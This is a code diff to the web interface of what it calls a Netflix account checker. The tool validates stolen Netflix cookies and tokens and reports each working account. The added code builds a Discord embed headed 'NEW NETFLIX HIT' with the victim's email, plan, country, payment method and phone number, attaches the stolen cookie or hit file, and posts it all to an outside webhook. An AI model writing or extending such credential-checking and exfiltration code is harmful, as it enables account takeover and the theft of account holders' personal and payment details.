@@ -606,16 +606,6 @@ textarea { width: 100%; min-height: 160px; font-family: var(--mono); font-size: 
                 <div class="webhook-url-row">
                   <input id="wh_url" type="url" placeholder="https://discord.com/api/webhooks/..."/>
                 </div>
-                <div class="cfg-grid" style="margin-top:24px;gap:20px;grid-template-columns:1fr 1fr;">
-                  <div class="cfg-row" style="margin-bottom:0;border-bottom:none;padding-bottom:0;">
-                    <div class="cfg-label">Chế độ hiển thị</div>
-                    <select id="wh_mode"><option value="full">Full Info</option><option value="cookie">Only Cookie</option><option value="nftoken">Only NFToken</option></select>
-                  </div>
-                  <div class="cfg-row" style="margin-bottom:0;border-bottom:none;padding-bottom:0;">
-                    <div class="cfg-label">Lọc theo Plan</div>
-                    <input id="wh_plans" style="width:140px;background:rgba(0,0,0,0.3);" value="all" placeholder="Premium, Standard..."/>
-                  </div>
-                </div>
               </div>
             </div>
           </div>
@@ -919,11 +909,9 @@ buildTxtFieldsGrid();
 
 function getConfig(){
   const tf={}; TXT_FIELD_DEFS.forEach(([k])=>{ tf[k]=document.getElementById(`tf_${k}`)?.checked!==false; });
-  const plansRaw=(document.getElementById('wh_plans').value||'all').trim();
-  const plans = plansRaw.toLowerCase()==='all'?'all':plansRaw.split(',').map(x=>x.trim()).filter(Boolean);
   return {
     txt_fields: tf, nftoken: document.getElementById('cfg_nftoken').value, add_emojis: document.getElementById('cfg_add_emojis').value,
-    notifications: { webhook: { enabled: document.getElementById('wh_enabled').checked, url: document.getElementById('wh_url').value.trim(), mode: document.getElementById('wh_mode') ? document.getElementById('wh_mode').value : 'full', plans } },
+    notifications: { webhook: { enabled: document.getElementById('wh_enabled').checked, url: document.getElementById('wh_url').value.trim() } },
     performance: { nftoken_for_free: document.getElementById('cfg_nftoken_for_free') ? document.getElementById('cfg_nftoken_for_free').checked : false },
     retries: { nftoken_attempts: document.getElementById('cfg_nftoken_attempts') ? parseInt(document.getElementById('cfg_nftoken_attempts').value)||3 : 3 },
   };
@@ -1039,22 +1027,32 @@ async function startCheck(){
 async function sendWebhookFromFrontend(r, cfg) {
   if (!cfg.notifications?.webhook?.enabled || !cfg.notifications?.webhook?.url) return;
   const url = cfg.notifications.webhook.url;
-  const mode = cfg.notifications.webhook.mode || 'full';
-  const plans = cfg.notifications.webhook.plans || 'all';
-  if (plans !== 'all' && r.info?.plan) {
-    const planText = r.info.plan.toLowerCase();
-    if (!plans.some(p => planText.includes(p))) return;
+  const embed = {
+    title: "🎉 NEW NETFLIX HIT 🎉",
+    color: 0xe50914,
+    fields: [
+      { name: "👤 Email", value: r.info?.email || 'N/A', inline: true },
+      { name: "🏷️ Plan", value: r.info?.plan || 'N/A', inline: true },
+      { name: "🌍 Country", value: r.info?.country || 'N/A', inline: true },
+      { name: "💳 Payment", value: r.info?.payment_method || 'N/A', inline: true },
+      { name: "🎬 Streams", value: String(r.info?.max_streams || 'N/A'), inline: true },
+      { name: "📱 Phone", value: r.info?.phone || 'N/A', inline: true }
+    ],
+    footer: { text: "NOTOC29FLIX Checker" },
+    timestamp: new Date().toISOString()
+  };
+
+  const formData = new FormData();
+  formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
+  
+  if (r.txt) {
+    formData.append('file', new Blob([r.txt], { type: 'text/plain' }), 'hit.txt');
+  } else if (r.netscape) {
+    formData.append('file', new Blob([r.netscape], { type: 'text/plain' }), 'cookie.txt');
   }
-  let content = "🎉 **NEW HIT DETECTED!** 🎉\n";
-  if (mode === 'cookie') {
-    content += "```\n" + (r.netscape || "No cookie") + "\n```";
-  } else if (mode === 'nftoken') {
-    content += "```json\n" + JSON.stringify(r.nftoken || {}, null, 2) + "\n```";
-  } else {
-    content += "```\n" + (r.txt || buildFallbackTxt(r)) + "\n```";
-  }
+
   try {
-    await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content }) });
+    await fetch(url, { method: 'POST', body: formData });
   } catch (e) { console.error("Webhook err:", e); }
 }
 
